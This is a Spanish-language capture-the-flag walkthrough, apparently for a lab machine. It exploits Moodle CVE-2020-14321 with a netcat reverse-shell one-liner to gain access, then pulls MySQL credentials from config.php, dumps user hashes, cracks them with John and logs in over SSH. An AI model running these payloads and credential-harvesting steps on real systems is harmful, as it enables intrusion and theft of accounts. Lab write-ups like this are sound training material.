## Vuln exploit & Gaining Access {-}

### Ganando accesso con moodle siendo professor {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cargamos y lanzamos el exploit

    ```bash
    git clone https://github.com/lanzt/CVE-2020-14321
    cd CVE-2020-14321
    python3 CVE-2020-14321_RCE.py --cookie v6tp73g3lnflt81rvtn29jivj6 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f" http://moodle.schooled.htb/moodle
    ```

Y ganamos accesso al systema como el usuario **www**. No podemos lanzar una pseudo consola con tratamiento de la TTY pero seguimos investigando.

### User pivoting {-}

```bash
cd ..
ls
pwd
cd /usr/local/www/apache24/data/moodle
ls -l
cat config.php
```

Vemos un `config.php` con credenciales para mysql. 

```bash
which mysql
which mysqlshow
export $PATH
```

Aqui vemos que el PATH es muy pequeño. Copiamos nuestro PATH de la maquina de atacante y la ponemos en la victima

```bash
export PATH=/root/.local/bin:/home/s4vitar/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin/:/home/s4vitar/go-workspace/bin:/home/s4vitar/.fzf/bin
export $PATH
which mysqlshow
```

Ahora que tenemos acceso a la utilidad mysqlshow. Nos conectamos con las credenciales.

```bash
mysqlshow -umoodle -pPlaybookMaster2020
mysqlshow -umoodle -pPlaybookMaster2020 moodle
```

Vemos una table **mdl_user**, miramos su contenido con mysql

```bash
mysql -umoodle -pPlaybookMaster2020 -e "select * from mdl_user" moodle
mysql -umoodle -pPlaybookMaster2020 -e "select username,password,email from mdl_user" moodle
```

Copiamos el resultado en un fichero hashes y tratamos el fichero para poder crackearlo con John

#### Crackeando contraseñas con John {-}

```bash
cat hashes | awk '{print $1 ":" $2}'
cat hashes | awk '{print $1 ":" $2}' | sponge hashes
john --wordlist=/usr/share/wordlists/rockyout.txt hashes
```

Encontramos el hash del usuario admin. Pero este usuario no existe en el systema. Mirando el email vemos que el usuario es **jamie**

```bash
ssh jamie@10.10.10.234
```

Ya somos jamie y poder leer el user.txt